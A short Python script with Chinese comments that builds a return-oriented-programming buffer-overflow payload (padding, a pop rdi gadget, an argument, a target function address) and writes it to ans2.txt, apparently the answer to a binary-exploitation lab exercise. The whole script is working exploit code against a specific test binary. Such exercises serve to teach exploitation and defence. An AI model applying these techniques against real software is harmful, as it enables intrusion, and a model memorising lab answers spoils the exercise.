import struct

# 1. Padding: 偏移量 16 字节
padding = b'A' * 16

# 2. Gadget: pop rdi; ret
# 从汇编中找到的地址 0x4012c7
pop_rdi_addr = struct.pack('<Q', 0x4012c7)

# 3. 参数: 0x3f8 (1016)
arg1 = struct.pack('<Q', 0x3f8)

# 4. 目标函数: func2
func2_addr = struct.pack('<Q', 0x401216)

# 5. 组合 Payload
# 流程: padding -> 覆盖返回地址为 pop_rdi -> 栈上取 0x3f8 给 rdi -> ret 跳转到 func2
payload = padding + pop_rdi_addr + arg1 + func2_addr

# 6. 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload 已写入 ans2.txt")
